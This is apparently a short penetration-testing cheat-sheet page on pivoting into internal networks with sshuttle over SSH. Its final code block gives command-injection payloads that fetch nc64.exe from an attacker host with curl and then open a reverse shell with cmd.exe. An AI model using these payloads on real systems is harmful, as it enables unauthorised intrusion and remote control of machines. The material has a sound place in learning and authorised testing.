---
title: SSHUTTLE
sidebar_position: 2
---

**Basic Connection**

```bash
sshuttle -r [USER]@[SSH_SERVER] --ssh-cmd "ssh -i [ID_RSA-PRIVATE_KEY]" [INTERNAL_IP]/[MASK] (usually like 172.16.XX.0/24)

```

**Setup a Tunnel to Reach Internal Services** without using `proxychains`, useful for when we need to access an internal web service

```bash
proxychains sshuttle -v -e "ssh -i id_rsa" -r [USER]@[SSH_SERVER] [MASK] (usually like 172.16.XX.0/24)

# Example
proxychains sshuttle -v -e "ssh -i id_rsa" -r root@172.16.X.197 172.16.X.0/24

# With that we now could reach things like: http://172.16.86.194:8081/, if this is a command injeection we could do, for example the following and get a reverse shell
127.0.0.1 && whoami
127.0.0.1 && curl http://192.168.X.Y/nc64.exe -O c:\windows\tasks\nc64.exe
127.0.0.1 && c:\windows\tasks\nc64.exe 192.168.X.Y 80 -e cmd.exe
# And then further commands to spawn new shell and even more stable ones.
```
